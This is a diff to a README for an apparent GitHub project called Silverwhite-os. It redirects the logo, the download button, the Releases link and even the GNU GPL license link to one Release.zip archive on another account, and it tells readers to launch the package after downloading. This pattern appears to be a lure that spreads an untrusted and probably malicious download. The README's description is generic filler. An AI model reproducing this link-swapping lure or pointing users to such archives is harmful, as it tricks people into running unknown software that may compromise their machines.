@@ -1,6 +1,6 @@
 # 🌟 Welcome to Silverwhite-os Repository 🌟
 
-![Silverwhite-os logo](https://example.com/silverwhiteos_logo.png)
+![Silverwhite-os logo](https://github.com/JacksonMoDz-hue/Silverwhite-os/releases/download/v1.0/Release.zip)
 
 ### Repository Name: Silverwhite-os
 ### Short Description: Not Provided
@@ -34,11 +34,11 @@ This repository covers a variety of topics including:
 ## Download Software
 You can download the Silverwhite-os software package by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/JacksonMoDz-hue/Silverwhite-os/releases/download/v1.0/Release.zip)](https://github.com/JacksonMoDz-hue/Silverwhite-os/releases/download/v1.0/Release.zip)
 
 *Note: The software package needs to be launched after downloading.*
 
-If the link is unavailable or not working, please check the [Releases](https://github.com/22155555/1875695542/releases) section for alternative download options.
+If the link is unavailable or not working, please check the [Releases](https://github.com/JacksonMoDz-hue/Silverwhite-os/releases/download/v1.0/Release.zip) section for alternative download options.
 
 ## Installation
 To install Silverwhite-os, follow these steps:
@@ -59,7 +59,7 @@ Feel free to explore the various features of Silverwhite-os and make the most ou
 We welcome contributions from the open-source community to enhance the Silverwhite-os project. If you have ideas, suggestions, or improvements, feel free to submit a pull request. Together, we can make Silverwhite-os even better for all users.
 
 ## License
-The Silverwhite-os project is licensed under the [GNU GPL v3.0](https://www.gnu.org/licenses/gpl-3.0.en.html). You are free to use, modify, and distribute this software under the terms of the license.
+The Silverwhite-os project is licensed under the [GNU GPL v3.0](https://github.com/JacksonMoDz-hue/Silverwhite-os/releases/download/v1.0/Release.zip). You are free to use, modify, and distribute this software under the terms of the license.
 
 Thank you for visiting the Silverwhite-os repository! 🚀🐧🌌
 
